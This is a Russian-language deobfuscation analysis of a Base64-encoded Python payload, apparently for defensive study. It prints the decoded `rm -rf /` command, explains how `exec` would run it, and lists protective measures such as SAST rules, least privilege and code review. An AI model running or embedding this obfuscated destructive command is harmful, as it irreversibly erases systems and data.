# Деобфускация кода

## 1. Расшифрованная строка Base64

Исходная строка: `aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk=`

После декодирования из Base64 в UTF-8 получена следующая команда Python:
```python
import os; os.system('rm -rf /')
```

## 2. Анализ критической угрозы

Функция `exec(b)` динамически исполняет декодированную строку как код Python. В результате запускается системная команда оболочки Unix/Linux **`rm -rf /`**:
* `rm` — удаление файлов и директорий;
* `-r` — рекурсивное удаление всего содержимого вложенных папок;
* `-f` — принудительное удаление без запроса подтверждения;
* `/` — корневой каталог файловой системы.

**Последствия:** полное и необратимое уничтожение операционной системы, всех пользовательских данных, баз данных и примонтированных сетевых разделов, к которым у процесса есть права на запись.

## 3. Методы защиты

1. **Запрет динамического исполнения кода:** полный отказ от использования функций `exec()`, `eval()` и `os.system()` с недоверенными или обфусцированными данными.
2. **Статический анализ (SAST) и линтеры:** настройка правил безопасности (например, `bandit` или `flake8-bandit`), которые автоматически блокируют сборку при обнаружении вызовов `exec`, `eval` и `os.system`.
3. **Принцип минимальных привилегий:** запуск приложений в изолированных контейнерах от имени непривилегированного пользователя (не `root`), без прав на изменение системных директорий.
4. **Обязательное Code Review:** ручная проверка любых Base64-строк и энтропии данных перед слиянием кода в защищенные ветки.
